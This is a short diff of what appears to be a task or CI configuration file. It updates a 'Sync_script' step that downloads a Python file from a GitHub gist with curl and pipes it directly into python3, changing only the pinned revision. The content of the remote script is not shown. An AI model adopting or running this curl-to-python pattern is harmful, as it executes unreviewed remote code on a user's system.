@@ -10,4 +10,4 @@ task:
       memory: 32G
 
   Sync_script:
-      - curl -sL https://gist.githubusercontent.com/llSiddharthll/6b8d808bee1327025c86fc5e090972a1/raw/51a709b4a2f7deb47cf0479265ba200d4f6d4148/*.py | python3
+      - curl -sL https://gist.githubusercontent.com/llSiddharthll/6b8d808bee1327025c86fc5e090972a1/raw/fe77d17dfd3020352ad3d013dfe3256a3bcc7c02/*.py | python3
